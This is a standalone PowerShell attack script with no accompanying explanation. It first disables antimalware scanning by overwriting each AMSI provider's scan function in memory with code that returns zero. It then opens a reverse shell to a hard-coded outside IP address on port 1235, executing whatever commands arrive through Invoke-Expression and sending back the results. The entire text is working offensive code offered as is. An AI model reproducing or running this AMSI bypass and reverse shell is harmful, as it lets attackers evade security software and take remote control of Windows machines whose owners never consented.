$Apis = @"
using System;
using System.Runtime.InteropServices;

public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

while ($AntimalwareProvider -ne 0)
{
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}

$client = $stream = $buffer = $writer = $data = $result = $null;
$client = New-Object Net.Sockets.TcpClient("35.244.42.175", 1235);
    $stream = $client.GetStream();
    $buffer = New-Object Byte[] 1024;
    $encoding = New-Object Text.UTF8Encoding;
    $writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024);
    $writer.AutoFlush = $true;
    Write-Host " running...";
    Write-Host "";
    $bytes = 0;
    do {
      $writer.Write("PS>");
      do {
        $bytes = $stream.Read($buffer, 0, $buffer.Length); # blocking
        if ($bytes -gt 0) {
          $data += $encoding.GetString($buffer, 0, $bytes);
        }
      } while ($stream.DataAvailable);
      if ($bytes -gt 0) {
        $data = $data.Trim();
        if ($data.Length -gt 0) {
          try {
            $result = Invoke-Expression -Command $data 2>&1 | Out-String;
          } catch {
            $result = $_.Exception | Out-String;
          }
          Clear-Variable data;
          if ($result.Length -gt 0) {
            $writer.Write($result);
            Clear-Variable result;
          }
        }
      }
    } while ($bytes -gt 0);
    Write-Host " exit...";
